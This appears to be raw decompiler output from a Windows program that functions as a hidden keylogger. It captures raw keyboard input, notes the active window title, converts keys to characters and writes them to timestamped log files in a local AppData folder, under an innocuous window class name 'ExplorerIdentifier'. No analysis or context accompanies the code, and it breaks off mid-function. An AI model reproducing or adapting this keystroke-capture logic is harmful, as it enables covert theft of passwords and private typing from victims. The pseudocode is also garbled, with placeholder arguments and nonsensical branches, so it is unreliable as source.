
// Address range: 0x40b155 - 0x40b167
int32_t function_40b155(void) {
    // 0x40b155
    int32_t v1; // 0x40b155
    if ((char)v1 != 0) {
        if ((char)v1 == 0) {
            // 0x40b15d
            return v1 & -256 | 1;
        }
    } else {
        if ((char)v1 != 0) {
            // 0x40b15d
            return v1 & -256 | 1;
        }
    }
    // 0x40b164
    return v1 & -256;
}

// Address range: 0x40b167 - 0x40b172
int16_t function_40b167(int32_t nVirtKey) {
    // 0x40b167
    return GetKeyState(20) & -255;
}

// Address range: 0x40b172 - 0x40b347
int32_t function_40b172(void) {
    // 0x40b172
    int32_t lpString; // bp-536, 0x40b172
    function_401293(&lpString, 0, 520);
    int16_t ** v1; // 0x40b172
    int16_t * v2; // bp-564, 0x40b172
    if (GetWindowTextW(GetForegroundWindow(), (int16_t *)&lpString, 260) < 1) {
        // 0x40b1f7
        v2 = (int16_t *)&g75;
        function_40428f((int32_t)&g75);
        v1 = &v2;
    } else {
        // 0x40b1bb
        v2 = (int16_t *)&g73;
        function_4043fa((int16_t *)&g73);
        int32_t v3 = function_40460a((int16_t *)&lpString); // 0x40b1d1
        function_4042c5(v3);
        int16_t * v4 = (int16_t *)&g74; // bp-576, 0x40b1de
        function_4043fa((int16_t *)&g74);
        function_406f1d();
        v1 = &v4;
    }
    int32_t v5 = (int32_t)v1;
    int32_t v6 = v5 - 4; // 0x40b211
    *(int32_t *)v6 = g165 + 528;
    int32_t v7 = lstrlenW((int16_t *)&g322); // 0x40b212
    int32_t v8 = v6; // 0x40b21b
    int32_t v9; // 0x40b172
    if (v7 == 0) {
        goto lab_0x40b256;
    } else {
        // 0x40b21d
        *(int32_t *)(v5 - 8) = g165 + 528;
        int32_t v10 = function_40460a((int16_t *)&g322); // 0x40b226
        v8 = v5 - 12;
        *(int32_t *)v8 = v10;
        int32_t v11 = function_404276((int32_t)&g322); // 0x40b22f
        function_406f1d();
        if (v11 == 0) {
            goto lab_0x40b256;
        } else {
            // 0x40b24a
            *(int32_t *)(g165 + 2576) = 1;
            v9 = v8;
            goto lab_0x40b270;
        }
    }
  lab_0x40b256:
    // 0x40b256
    *(int32_t *)(v8 - 4) = 0;
    int32_t v12 = v8 - 8; // 0x40b25e
    *(int32_t *)v12 = g165 + 528;
    lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
    *(int32_t *)(g165 + 2576) = 0;
    v9 = v12;
    goto lab_0x40b270;
  lab_0x40b270:
    // 0x40b270
    *(int32_t *)(v9 - 4) = 0;
    *(int32_t *)(v9 - 8) = 128;
    *(int32_t *)(v9 - 12) = 4;
    *(int32_t *)(v9 - 16) = 0;
    *(int32_t *)(v9 - 20) = 1;
    *(int32_t *)(v9 - 24) = 4;
    int32_t v13 = v9 - 28; // 0x40b27d
    *(int32_t *)v13 = *(int32_t *)(g165 + 12);
    int32_t * v14 = CreateFileW((int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (struct _SECURITY_ATTRIBUTES *)&g322, (int32_t)&g322, (int32_t)&g322, &g322); // 0x40b280
    *(int32_t *)(g165 + 4) = (int32_t)v14;
    int32_t v15 = v13; // 0x40b29b
    int32_t v16 = g165; // 0x40b29b
    if (*(int32_t *)(g165 + 2576) == 0) {
        // 0x40b29d
        *(int32_t *)(v9 - 32) = (int32_t)L"\r\n";
        int32_t v17 = lstrlenW((int16_t *)&g322); // 0x40b2a5
        *(int32_t *)(v9 - 36) = 0;
        *(int32_t *)(v9 - 40) = g165 + 8;
        *(int32_t *)(v9 - 44) = v17;
        *(int32_t *)(v9 - 48) = (int32_t)L"\r\n";
        *(int32_t *)(v9 - 52) = *(int32_t *)(g165 + 4);
        WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
        *(int32_t *)(v9 - 56) = 0;
        *(int32_t *)(v9 - 60) = g165 + 8;
        *(int32_t *)(v9 - 64) = 0;
        *(int32_t *)(v9 - 68) = 0;
        *(int32_t *)(v9 - 72) = *(int32_t *)(g165 + 4);
        WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
        *(int32_t *)(v9 - 76) = (int32_t)L"\r\n";
        int32_t v18 = lstrlenW((int16_t *)&g322); // 0x40b2f6
        *(int32_t *)(v9 - 80) = 0;
        *(int32_t *)(v9 - 84) = g165 + 8;
        *(int32_t *)(v9 - 88) = v18;
        *(int32_t *)(v9 - 92) = (int32_t)L"\r\n";
        int32_t v19 = v9 - 96; // 0x40b306
        *(int32_t *)v19 = *(int32_t *)(g165 + 4);
        WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
        v15 = v19;
        v16 = g165;
    }
    int32_t v20 = lstrlenW((int16_t *)&g322); // 0x40b317
    *(int32_t *)(v15 - 8) = 0;
    *(int32_t *)(v15 - 12) = v16 + 8;
    *(int32_t *)(v15 - 16) = 2 * v20;
    *(int32_t *)(v15 - 24) = *(int32_t *)(g165 + 4);
    WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
    *(int32_t *)(v15 - 28) = *(int32_t *)(g165 + 4);
    CloseHandle(&g322);
    return function_406f1d();
}

// Address range: 0x40b347 - 0x40b778
int32_t function_40b347(int32_t hWnd, int32_t Msg, int32_t wParam, int32_t hRawInput) {
    int32_t pcbSize2 = 520; // bp-628, 0x40b35c
    int32_t pcbSize = 0; // bp-608, 0x40b363
    int32_t v1; // bp-528, 0x40b347
    function_401293(&v1, 0, 520);
    int32_t lpString; // bp-568, 0x40b347
    switch (Msg) {
        case 1: {
            // 0x40b739
            pcbSize2 = 12;
            lpString = hWnd;
            int32_t pRawInputDevices = 1; // bp-576, 0x40b75b
            RegisterRawInputDevices((struct tagRAWINPUTDEVICE *)&pRawInputDevices, 1, 12);
            // 0x40b766
            function_406f1d();
            return 0;
        }
        case 16: {
            // 0x40b730
            pcbSize2 = 0;
            PostQuitMessage(0);
            // 0x40b766
            function_406f1d();
            return 0;
        }
        case 255: {
            // 0x40b3aa
            pcbSize2 = 16;
            if (GetRawInputData(hRawInput, 0x10000003, NULL, &pcbSize, 16) == -1) {
                // 0x40b766
                function_406f1d();
                return 0;
            }
            // break -> 0x40b3c9
            break;
        }
        default: {
            // 0x40b391
            pcbSize2 = hRawInput;
            int32_t result = DefWindowProcA((int32_t *)hWnd, Msg, wParam, hRawInput);
            function_406f1d();
            return result;
        }
    }
    int32_t pData = function_406fa7(); // 0x40b3cd
    if (pData == 0) {
        // 0x40b766
        function_406f1d();
        return 0;
    }
    // 0x40b3e0
    if (GetRawInputData(hRawInput, 0x10000003, (int32_t *)pData, &pcbSize2, 16) != 16) {
        // 0x40b3fc
        function_406f8d();
        // 0x40b766
        function_406f1d();
        return 0;
    }
    // 0x40b408
    if (*(int32_t *)(pData + 24) != 256) {
        // 0x40b766
        function_406f1d();
        return 0;
    }
    // 0x40b415
    int32_t v2; // 0x40b347
    int16_t * v3; // bp-680, 0x40b347
    if (GetWindowTextW(GetForegroundWindow(), (int16_t *)&lpString, 260) < 1) {
        // 0x40b453
        v3 = L"Unknow";
        function_40428f((int32_t)L"Unknow");
        v2 = (int32_t)&v3;
    } else {
        // 0x40b430
        int32_t v4; // bp-580, 0x40b347
        v3 = (int16_t *)&v4;
        int32_t v5 = function_40460a((int16_t *)&v4); // 0x40b439
        int32_t v6 = v5; // bp-684, 0x40b43e
        function_4043c7(v5);
        function_406f1d();
        v2 = &v6;
    }
    // 0x40b461
    function_40b8c7();
    int32_t v7 = *(int32_t *)(v2 + 20); // 0x40b46d
    *(int32_t *)(v2 + 32) = 0;
    int32_t v8 = v2; // 0x40b477
    if (v7 != 0) {
        // 0x40b479
        *(int32_t *)(v2 - 4) = v7;
        lstrlenW((int16_t *)&g322);
        int32_t v9 = function_406e8d(); // 0x40b487
        *(int32_t *)(v2 - 8) = v7;
        v8 = v2 - 12;
        *(int32_t *)v8 = v9;
        *(int32_t *)(v2 + 28) = v9;
        lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
    }
    int32_t v10 = v8;
    int32_t v11 = v10 - 4; // 0x40b4a4
    *(int32_t *)v11 = g165 + 16;
    function_4043fa((int16_t *)&g322);
    int32_t v12 = g165; // 0x40b4b1
    int32_t v13 = v11; // 0x40b4b1
    if (*(int32_t *)g165 != 0) {
        int32_t * v14 = (int32_t *)(v10 + 24); // 0x40b4c0
        *v14 = *(int32_t *)(g165 + 2640);
        *(int32_t *)(v10 - 24) = g165 + 2584;
        function_40153f(&g322);
        int32_t v15 = v10 - 40; // 0x40b4d1
        *(int32_t *)(v10 + 4) = v15;
        *(int32_t *)v15 = 0;
        int32_t v16 = *v14; // 0x40b4dc
        int32_t v17 = v15; // 0x40b4e0
        int32_t v18 = v15; // 0x40b4e0
        if (v16 != 0) {
            // 0x40b4e2
            *(int32_t *)(v10 - 44) = v16;
            lstrlenW((int16_t *)&g322);
            int32_t v19 = function_406f2c(); // 0x40b4f3
            *(int32_t *)*(int32_t *)v10 = v19;
            *(int32_t *)(v10 - 48) = *(int32_t *)(v10 + 20);
            v18 = v10 - 52;
            *(int32_t *)v18 = v19;
            lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
            v17 = *(int32_t *)(v10 - 8);
        }
        int32_t v20 = v18;
        *(int32_t *)(v17 + 4) = *(int32_t *)(v20 + 68);
        *(int16_t *)(v17 + 8) = *(int16_t *)(v20 + 72);
        *(int32_t *)(v20 - 4) = v20 + 76;
        function_404656((int32_t)&g322);
        int32_t v21 = function_405980((int32_t)&g322, (int32_t)&g322); // 0x40b52e
        v13 = v20 - 8;
        *(int32_t *)v13 = v21;
        function_405f32(&g322);
        function_405966();
        v12 = g165;
    }
    // 0x40b54b
    int32_t v22; // 0x40b347
    int32_t v23; // 0x40b347
    if (*(int32_t *)(v12 + 2580) == 0) {
        goto lab_0x40b71e;
    } else {
        int32_t v24 = v13 - 4; // 0x40b55c
        *(int32_t *)v24 = v12 + 528;
        int32_t v25 = lstrlenW((int16_t *)&g322); // 0x40b55d
        v22 = v24;
        if (v25 == 0) {
            goto lab_0x40b5a9;
        } else {
            // 0x40b56c
            *(int32_t *)(v13 - 8) = g165 + 528;
            int32_t v26 = function_40460a((int16_t *)&g322); // 0x40b576
            int32_t v27 = v13 - 12; // 0x40b57b
            *(int32_t *)v27 = v26;
            int32_t v28 = function_404276((int32_t)&g322); // 0x40b580
            function_406f1d();
            *(int32_t *)v13 = 0;
            v22 = v27;
            if (v28 == 0) {
                goto lab_0x40b5a9;
            } else {
                // 0x40b59d
                *(int32_t *)(g165 + 2576) = 1;
                v23 = v27;
                goto lab_0x40b5c4;
            }
        }
    }
  lab_0x40b71e:
    // 0x40b71e
    function_406f8d();
    function_4022f8();
    // 0x40b766
    function_406f1d();
    return 0;
  lab_0x40b5a9:;
    int32_t v29 = v22;
    *(int32_t *)(v29 - 4) = *(int32_t *)(v29 + 32);
    int32_t v30 = v29 - 8; // 0x40b5b2
    *(int32_t *)v30 = g165 + 528;
    lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
    *(int32_t *)(g165 + 2576) = 0;
    v23 = v30;
    goto lab_0x40b5c4;
  lab_0x40b5c4:
    // 0x40b5c4
    *(int32_t *)(v23 - 4) = 0;
    *(int32_t *)(v23 - 8) = 128;
    *(int32_t *)(v23 - 12) = 4;
    *(int32_t *)(v23 - 16) = 0;
    *(int32_t *)(v23 - 20) = 1;
    *(int32_t *)(v23 - 24) = 4;
    int32_t v31 = v23 - 28; // 0x40b5d1
    *(int32_t *)v31 = *(int32_t *)(g165 + 12);
    int32_t * v32 = CreateFileW((int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (struct _SECURITY_ATTRIBUTES *)&g322, (int32_t)&g322, (int32_t)&g322, &g322); // 0x40b5d4
    *(int32_t *)(g165 + 4) = (int32_t)v32;
    int32_t v33 = g165; // 0x40b5e9
    int32_t v34 = v31; // 0x40b5e9
    if (*(int32_t *)(g165 + 2576) == 0) {
        // 0x40b5ef
        *(int32_t *)(v23 - 32) = (int32_t)L"\r\n";
        int32_t v35 = lstrlenW((int16_t *)&g322); // 0x40b5f7
        *(int32_t *)(v23 - 36) = 0;
        *(int32_t *)(v23 - 40) = g165 + 8;
        int32_t * v36 = (int32_t *)(v23 - 44); // 0x40b5ff
        *v36 = v35;
        int32_t * v37 = (int32_t *)(v23 - 48); // 0x40b605
        *v37 = (int32_t)L"\r\n";
        *(int32_t *)(v23 - 52) = *(int32_t *)(g165 + 4);
        WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
        *(int32_t *)(v23 - 56) = (int32_t)L"\r\n";
        int32_t v38 = lstrlenW((int16_t *)&g322); // 0x40b621
        *(int32_t *)(v23 - 60) = 0;
        *(int32_t *)(v23 - 64) = g165 + 8;
        *(int32_t *)(v23 - 68) = v38;
        *(int32_t *)(v23 - 72) = (int32_t)L"\r\n";
        int32_t v39 = v23 - 76; // 0x40b63a
        *(int32_t *)v39 = *(int32_t *)(g165 + 4);
        WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
        int32_t v40 = *v36; // 0x40b645
        *v37 = g165 + 8;
        int32_t v41 = 0; // 0x40b652
        int32_t v42 = 0; // 0x40b652
        int32_t v43 = v39; // 0x40b652
        if (v40 != 0) {
            // 0x40b654
            v43 = v23 - 80;
            *(int32_t *)v43 = v40;
            int32_t v44 = lstrlenW((int16_t *)&g322); // 0x40b655
            v42 = *v37;
            v41 = 2 * v44;
        }
        int32_t v45 = v43;
        *(int32_t *)(v45 - 4) = 0;
        *(int32_t *)(v45 - 8) = *(int32_t *)(v45 + 28);
        *(int32_t *)(v45 - 12) = v41;
        *(int32_t *)(v45 - 16) = v42;
        *(int32_t *)(v45 - 20) = *(int32_t *)(g165 + 4);
        WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
        *(int32_t *)(v45 - 24) = (int32_t)L"\r\n";
        int32_t v46 = lstrlenW((int16_t *)&g322); // 0x40b685
        *(int32_t *)(v45 - 28) = 0;
        *(int32_t *)(v45 - 32) = g165 + 8;
        *(int32_t *)(v45 - 36) = v46;
        *(int32_t *)(v45 - 40) = (int32_t)L"\r\n";
        *(int32_t *)(v45 - 44) = *(int32_t *)(g165 + 4);
        WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
        *(int32_t *)(v45 - 48) = (int32_t)L"\r\n";
        int32_t v47 = lstrlenW((int16_t *)&g322); // 0x40b6af
        *(int32_t *)(v45 - 52) = 0;
        *(int32_t *)(v45 - 56) = g165 + 8;
        *(int32_t *)(v45 - 60) = v47;
        *(int32_t *)(v45 - 64) = (int32_t)L"\r\n";
        int32_t v48 = v45 - 68; // 0x40b6c2
        *(int32_t *)v48 = *(int32_t *)(g165 + 4);
        WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
        v33 = g165;
        v34 = v48;
    }
    // 0x40b6d1
    *(int32_t *)(v34 - 4) = function_40b778();
    int32_t v49 = lstrlenW((int16_t *)&g322); // 0x40b6e1
    int32_t v50 = function_40b778(); // 0x40b6f2
    *(int32_t *)(v34 - 8) = 0;
    *(int32_t *)(v34 - 12) = v33 + 8;
    *(int32_t *)(v34 - 16) = 2 * v49;
    *(int32_t *)(v34 - 20) = v50;
    *(int32_t *)(v34 - 24) = *(int32_t *)(g165 + 4);
    WriteFile(&g322, &g322, (int32_t)&g322, &g322, (struct _OVERLAPPED *)&g322);
    *(int32_t *)(v34 - 28) = *(int32_t *)(g165 + 4);
    CloseHandle(&g322);
    goto lab_0x40b71e;
}

// Address range: 0x40b778 - 0x40b8c7
int32_t function_40b778(void) {
    // 0x40b778
    int32_t v1; // 0x40b778
    uint32_t v2 = v1;
    uint32_t uCode = v2 % 256; // 0x40b792
    int32_t pwszBuff; // bp-264, 0x40b778
    function_401293(&pwszBuff, 0, 256);
    int32_t wScanCode = MapVirtualKeyA(uCode, 0); // 0x40b7a2
    int32_t v3; // 0x40b778
    int32_t v4; // 0x40b778
    bool v5; // 0x40b778
    int32_t v6; // 0x40b778
    int32_t v7; // 0x40b778
    if (uCode < 100) {
        if (uCode == 99) {
            goto lab_0x40b7de;
        } else {
            if (uCode < 37) {
                if (uCode == 36) {
                    goto lab_0x40b7de;
                } else {
                    if (uCode < 19) {
                        switch ((char)v2) {
                            case 18: {
                                goto lab_0x40b7de;
                            }
                            case 8: {
                                goto lab_0x40b7de;
                            }
                            case 9: {
                                goto lab_0x40b7de;
                            }
                            default: {
                                // 0x40b7cf
                                v4 = uCode - 13;
                                goto lab_0x40b7d2;
                            }
                        }
                    } else {
                        if (uCode == 20) {
                            goto lab_0x40b7de;
                        } else {
                            // 0x40b817
                            v3 = uCode - 32;
                            goto lab_0x40b8b0;
                        }
                    }
                }
            } else {
                if (uCode < 92) {
                    switch ((char)v2) {
                        case 91: {
                            goto lab_0x40b7de;
                        }
                        case 37: {
                            goto lab_0x40b7de;
                        }
                        case 38: {
                            goto lab_0x40b7de;
                        }
                        case 39: {
                            goto lab_0x40b7de;
                        }
                        default: {
                            int32_t v8 = uCode - 40; // 0x40b837
                            if (v8 == 0) {
                                goto lab_0x40b7de;
                            } else {
                                // 0x40b83c
                                v5 = v8 == 6;
                                goto lab_0x40b7dc;
                            }
                        }
                    }
                } else {
                    if (uCode == 92) {
                        goto lab_0x40b7de;
                    } else {
                        // 0x40b848
                        v6 = uCode - 96;
                        goto lab_0x40b8b9;
                    }
                }
            }
        }
    } else {
        if (uCode < 187) {
            if (uCode == 186) {
                goto lab_0x40b7de;
            } else {
                if (uCode < 106) {
                    if (uCode == 105) {
                        goto lab_0x40b7de;
                    } else {
                        // 0x40b863
                        v7 = uCode - 100;
                        goto lab_0x40b868;
                    }
                } else {
                    if (uCode < 175) {
                        goto lab_0x40b7de;
                    } else {
                        // 0x40b889
                        v4 = uCode - 175;
                        goto lab_0x40b7d2;
                    }
                }
            }
        } else {
            if (uCode < 193) {
                if (uCode == 192) {
                    goto lab_0x40b7de;
                } else {
                    // 0x40b8a0
                    v7 = uCode - 187;
                    goto lab_0x40b868;
                }
            } else {
                // 0x40b8a9
                v3 = uCode - 219;
                goto lab_0x40b8b0;
            }
        }
    }
  lab_0x40b7de:;
    char lpKeyState = GetKeyState(uCode); // bp-5, 0x40b7ef
    ToUnicode(uCode, wScanCode | 256, &lpKeyState, (int16_t *)&pwszBuff, 1, 0);
    return &pwszBuff;
  lab_0x40b8b0:
    // 0x40b8b0
    if (v3 == 0) {
        goto lab_0x40b7de;
    } else {
        // 0x40b8b6
        v6 = v3 - 1;
        goto lab_0x40b8b9;
    }
  lab_0x40b868:
    // 0x40b868
    if (v7 == 0) {
        goto lab_0x40b7de;
    } else {
        // 0x40b86e
        v3 = v7 - 1;
        goto lab_0x40b8b0;
    }
  lab_0x40b8b9:;
    // 0x40b8b9
    int32_t v9; // 0x40b778
    if (v6 == 0) {
        goto lab_0x40b7de;
    } else {
        // 0x40b8bf
        v9 = v6 - 1;
        goto lab_0x40b7d7;
    }
  lab_0x40b7d2:
    // 0x40b7d2
    if (v4 == 0) {
        goto lab_0x40b7de;
    } else {
        // 0x40b7d4
        v9 = v4 - 3;
        goto lab_0x40b7d7;
    }
  lab_0x40b7dc:
    // 0x40b7dc
    if (!v5) {
        // 0x40b7e4
        lpKeyState = GetKeyState(uCode);
        ToUnicode(uCode, wScanCode, &lpKeyState, (int16_t *)&pwszBuff, 1, 0);
        return &pwszBuff;
    }
    goto lab_0x40b7de;
  lab_0x40b7d7:
    // 0x40b7d7
    if (v9 == 0) {
        goto lab_0x40b7de;
    } else {
        // 0x40b7d9
        v5 = v9 == 1;
        goto lab_0x40b7dc;
    }
}

// Address range: 0x40b8c7 - 0x40ba2c
int32_t function_40b8c7(void) {
    // 0x40b8c7
    int32_t result; // 0x40b8c7
    uint32_t v1 = result;
    uint32_t uCode = v1 % 256; // 0x40b8d7
    *(int32_t *)result = 0;
    bool v2; // 0x40b8c7
    int32_t v3 = v2 ? -4 : 4; // 0x40b8dc
    int32_t v4 = v3 + result; // 0x40b8dc
    *(int32_t *)v4 = 0;
    int32_t v5 = v4 + v3; // 0x40b8dd
    *(int32_t *)v5 = 0;
    *(int32_t *)(v5 + v3) = 0;
    int32_t v6; // 0x40b8c7
    int32_t v7; // 0x40b8c7
    int32_t v8; // 0x40b8c7
    int32_t v9; // 0x40b8c7
    if (uCode < 100) {
        if (uCode == 99) {
          lab_0x40ba22:
            // 0x40ba22
            *(int32_t *)(result + 4) = uCode;
            // 0x40ba25
            return result;
        }
        if (uCode < 37) {
            if (uCode == 36) {
                // 0x40ba22
                *(int32_t *)(result + 4) = uCode;
                // 0x40ba25
                return result;
            }
            if (uCode < 19) {
                switch ((char)v1) {
                    case 18: {
                        goto lab_0x40ba22;
                    }
                    case 8: {
                        goto lab_0x40ba22;
                    }
                    case 9: {
                        goto lab_0x40ba22;
                    }
                    default: {
                        // 0x40b919
                        v7 = uCode - 13;
                        goto lab_0x40b91c;
                    }
                }
            } else {
                if (uCode == 20) {
                    // 0x40ba22
                    *(int32_t *)(result + 4) = uCode;
                    // 0x40ba25
                    return result;
                }
                // 0x40b935
                v6 = uCode - 32;
                goto lab_0x40b9da;
            }
        } else {
            if (uCode < 92) {
                switch ((char)v1) {
                    case 91: {
                        goto lab_0x40ba22;
                    }
                    case 37: {
                        goto lab_0x40ba22;
                    }
                    case 38: {
                        goto lab_0x40ba22;
                    }
                    case 39: {
                        goto lab_0x40ba22;
                    }
                    case 40: {
                        goto lab_0x40ba22;
                    }
                    case 46: {
                        goto lab_0x40ba22;
                    }
                    default: {
                        goto lab_0x40b9eb;
                    }
                }
            } else {
                if (uCode == 92) {
                    // 0x40ba22
                    *(int32_t *)(result + 4) = uCode;
                    // 0x40ba25
                    return result;
                }
                // 0x40b97e
                v8 = uCode - 96;
                goto lab_0x40b9df;
            }
        }
    } else {
        if (uCode < 187) {
            if (uCode == 186) {
                // 0x40ba22
                *(int32_t *)(result + 4) = uCode;
                // 0x40ba25
                return result;
            }
            if (uCode < 106) {
                if (uCode == 105) {
                    // 0x40ba22
                    *(int32_t *)(result + 4) = uCode;
                    // 0x40ba25
                    return result;
                }
                // 0x40b99d
                v9 = uCode - 100;
                goto lab_0x40b9a2;
            } else {
                if (uCode < 175) {
                    // 0x40ba22
                    *(int32_t *)(result + 4) = uCode;
                    // 0x40ba25
                    return result;
                }
                // 0x40b9b7
                v7 = uCode - 175;
                goto lab_0x40b91c;
            }
        } else {
            if (uCode < 193) {
                if (uCode == 192) {
                    // 0x40ba22
                    int32_t v10; // 0x40b8c7
                    *(int32_t *)(v10 + 4) = uCode;
                }
                // 0x40b9ca
                v9 = uCode - 187;
                goto lab_0x40b9a2;
            } else {
                // 0x40b9d3
                v6 = uCode - 219;
                goto lab_0x40b9da;
            }
        }
    }
  lab_0x40b9da:
    // 0x40b9da
    if (v6 == 0) {
        // 0x40ba22
        *(int32_t *)(result + 4) = uCode;
        // 0x40ba25
        return result;
    }
    // 0x40b9dc
    v8 = v6 - 1;
    goto lab_0x40b9df;
  lab_0x40b9df:
    // 0x40b9df
    if (v8 == 0) {
        // 0x40ba22
        *(int32_t *)(result + 4) = uCode;
        // 0x40ba25
        return result;
    }
    int32_t v11 = v8 - 1; // 0x40b9e1
    goto lab_0x40b9e4;
  lab_0x40b9a2:
    // 0x40b9a2
    if (v9 == 0) {
        // 0x40ba22
        *(int32_t *)(result + 4) = uCode;
        // 0x40ba25
        return result;
    }
    // 0x40b9a4
    v6 = v9 - 1;
    goto lab_0x40b9da;
  lab_0x40b91c:
    // 0x40b91c
    if (v7 == 0) {
        // 0x40ba22
        *(int32_t *)(result + 4) = uCode;
        // 0x40ba25
        return result;
    }
    // 0x40b922
    v11 = v7 - 3;
    goto lab_0x40b9e4;
  lab_0x40b9e4:
    // 0x40b9e4
    if (v11 < 2) {
        // 0x40ba22
        *(int32_t *)(result + 4) = uCode;
        // 0x40ba25
        return result;
    }
  lab_0x40b9eb:;
    // 0x40b9eb
    int32_t lpKeyState; // bp-260, 0x40b8c7
    function_401293(&lpKeyState, 0, 256);
    int32_t wScanCode = MapVirtualKeyA(uCode, 0); // 0x40ba04
    ToUnicode(uCode, wScanCode, (char *)&lpKeyState, (int16_t *)(result + 8), 1, 0);
    // 0x40ba25
    return result;
}

// Address range: 0x40ba2c - 0x40bcbb
int32_t function_40ba2c(int32_t a1) {
    // 0x40ba2c
    int128_t v1; // 0x40ba2c
    int128_t v2 = v1;
    int32_t * moduleHandle = GetModuleHandleA(NULL); // 0x40ba3e
    int128_t v3 = __asm_xorps(v2, v2); // 0x40ba54
    int32_t v4 = 0; // bp-792, 0x40ba57
    bool v5; // 0x40ba2c
    int32_t v6 = v5 ? -4 : 4; // 0x40ba57
    int32_t v7 = v6 + (int32_t)&v4; // 0x40ba57
    *(int32_t *)v7 = 0;
    int32_t v8 = v7 + v6; // 0x40ba64
    int64_t v9; // 0x40ba2c
    __asm_movlpd(v9, v3);
    __asm_movlpd(v9, v3);
    __asm_movlpd(v9, v3);
    *(int32_t *)v8 = 0;
    *(int32_t *)(v8 + v6) = 0;
    function_401293((int32_t *)(g165 + 528), (int32_t)&g322, (int32_t)&g322);
    int32_t v10 = g165 + 16; // 0x40ba8a
    function_401293((int32_t *)v10, 0, 520);
    SHGetFolderPathW(NULL, 28, NULL, 0, (int16_t *)v10);
    lstrcatW((int16_t *)(g165 + 16), (int16_t *)&g16);
    int16_t * lpPathName = (int16_t *)(g165 + 16); // 0x40bac7
    int16_t * v11 = lpPathName; // bp-848, 0x40bac7
    CreateDirectoryW(lpPathName, NULL);
    int16_t ** v12 = &v11; // 0x40badb
    if (*(int32_t *)(g165 + 2580) != 0) {
        // 0x40badd
        int32_t lpString1; // bp-568, 0x40ba2c
        function_401293(&lpString1, 0, 520);
        lstrcpyW((int16_t *)&lpString1, (int16_t *)(g165 + 16));
        int32_t lpString1_; // bp-576, 0x40ba2c
        lstrcatW((int16_t *)&lpString1_, (int16_t *)&g72);
        int32_t v13; // bp-584, 0x40ba2c
        int16_t * v14 = (int16_t *)&v13; // bp-872, 0x40bb1f
        function_40460a((int16_t *)&v13);
        int32_t v15 = function_413c83((int32_t)&g322); // 0x40bb29
        v14 = (int16_t *)v15;
        function_401fd0((int32_t *)v15);
        function_401586();
        v12 = &v14;
    }
    int32_t v16 = (int32_t)v12;
    *(int32_t *)(v16 - 4) = (int32_t)L"ExplorerIdentifier";
    function_4043fa((int16_t *)&g322);
    int32_t v17 = v16 - 8; // 0x40bb58
    int32_t * v18 = (int32_t *)v17; // 0x40bb58
    *v18 = 4;
    *v18 = function_4044c4();
    function_4042c5((int32_t)&g322);
    function_406f1d();
    int32_t v19 = v16 + 8; // 0x40bb7e
    *(int32_t *)v19 = 0;
    int32_t v20 = v17; // 0x40bb88
    if (*(int32_t *)(g165 + 2580) != 0) {
        // 0x40bb8e
        *(int32_t *)(v16 - 12) = v16 + 12;
        GetLocalTime((struct _SYSTEMTIME *)&g322);
        int32_t * v21 = (int32_t *)(v16 - 16); // 0x40bb9e
        *v21 = (int32_t)*(int16_t *)(v16 + 20);
        int32_t * v22 = (int32_t *)(v16 - 20); // 0x40bba4
        *v22 = (int32_t)*(int16_t *)(v16 + 18);
        int32_t * v23 = (int32_t *)(v16 - 24); // 0x40bbaa
        *v23 = (int32_t)*(int16_t *)(v16 + 16);
        int32_t * v24 = (int32_t *)(v16 - 28); // 0x40bbb0
        *v24 = (int32_t)*(int16_t *)v19;
        int32_t * v25 = (int32_t *)(v16 - 32); // 0x40bbb6
        *v25 = (int32_t)*(int16_t *)(v16 + 10);
        int32_t * v26 = (int32_t *)(v16 - 36); // 0x40bbbc
        *v26 = (int32_t)*(int16_t *)(v16 + 14);
        int32_t * v27 = (int32_t *)(v16 - 40); // 0x40bbc4
        *v27 = (int32_t)L"%02d-%02d-%02d_%02d.%02d.%02d";
        int32_t * v28 = (int32_t *)(v16 - 44); // 0x40bbc9
        *v28 = v16 + 108;
        wsprintfW((int16_t *)&g322, (int16_t *)&g322);
        *v21 = g165 + 16;
        function_4043fa((int16_t *)&g322);
        *v22 = v16 + 104;
        function_4043fa((int16_t *)&g322);
        *v23 = 0;
        *v24 = 128;
        *v25 = 2;
        *v26 = 0;
        *v27 = 1;
        *v28 = 0x10000000;
        *(int32_t *)(v16 - 48) = *(int32_t *)(g165 + 12);
        int32_t * v29 = CreateFileW((int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (struct _SECURITY_ATTRIBUTES *)&g322, (int32_t)&g322, (int32_t)&g322, &g322); // 0x40bc08
        int32_t v30 = (int32_t)v29; // 0x40bc08
        v20 = v16 - 52;
        *(int32_t *)v20 = v30;
        *(int32_t *)(g165 + 4) = v30;
        CloseHandle(&g322);
    }
    int32_t v31 = (int32_t)moduleHandle; // 0x40ba3e
    int32_t v32 = v20;
    *(int32_t *)(v32 + 72) = *(int32_t *)(v32 + 12);
    *(int32_t *)(v32 - 4) = v32 + 36;
    *(int32_t *)(v32 + 40) = 0x40b347;
    *(int32_t *)(v32 + 52) = v31;
    RegisterClassW((struct tagWNDCLASSW *)&g322);
    *(int32_t *)(v32 - 8) = a1;
    *(int32_t *)(v32 - 12) = v31;
    *(int32_t *)(v32 - 16) = 0;
    *(int32_t *)(v32 - 20) = -3;
    *(int32_t *)(v32 - 24) = 0;
    *(int32_t *)(v32 - 28) = 0;
    *(int32_t *)(v32 - 32) = 0;
    *(int32_t *)(v32 - 36) = 0;
    *(int32_t *)(v32 - 40) = 0;
    *(int32_t *)(v32 - 44) = 0;
    *(int32_t *)(v32 - 48) = *(int32_t *)(v32 + 68);
